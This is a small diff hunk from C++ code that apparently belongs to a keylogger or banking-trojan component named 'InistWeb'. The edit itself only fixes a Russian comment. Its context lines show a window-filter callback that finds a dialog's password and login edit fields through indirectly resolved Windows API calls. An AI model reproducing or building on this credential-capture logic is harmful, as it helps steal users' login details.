@@ -252,7 +252,7 @@ namespace InistWeb
 	void OnGetLogWnd(LPVOID Sender, HWND &LogWnd)
 	{
 		TKlgWndFilter* filter = (TKlgWndFilter*)Sender;
-		//ищек контрол ввода пароля
+		//ищет контрол ввода пароля
 		HWND parent = (HWND)pGetParent(filter->DialogWnd);
 		HWND PassWnd = (HWND)pFindWindowExA( parent, 0, "EDIT", 0 );
 		LogWnd = (HWND)pFindWindowExA( parent, PassWnd, "EDIT", 0 );
